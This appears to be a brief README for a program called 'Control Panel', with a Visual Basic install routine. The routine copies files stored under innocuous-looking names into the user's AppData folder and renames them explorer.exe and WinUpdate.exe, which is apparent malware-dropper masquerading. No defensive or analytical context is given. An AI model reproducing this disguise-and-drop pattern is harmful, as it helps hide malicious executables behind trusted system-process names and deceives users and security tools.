Control Panel
=========================

```
cpanel.exe /default - Shows config from local files in "./Files" directory
cpanel.exe /install - Executes install NPS
```

### Install Process

	FileCopy App.Path & "\Files\msex.text", GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe"   'explorer.exe
	FileCopy App.Path & "\Files\AS4T.CVF", GetSpecialFolderA(CSIDL_APPDATA) & "System\WinUpdate.exe"     'winUpdate.exe
	FileCopy App.Path & "\Files\files.CAB", GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp"
	FileCopy App.Path & "\Files\main.exe", GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP"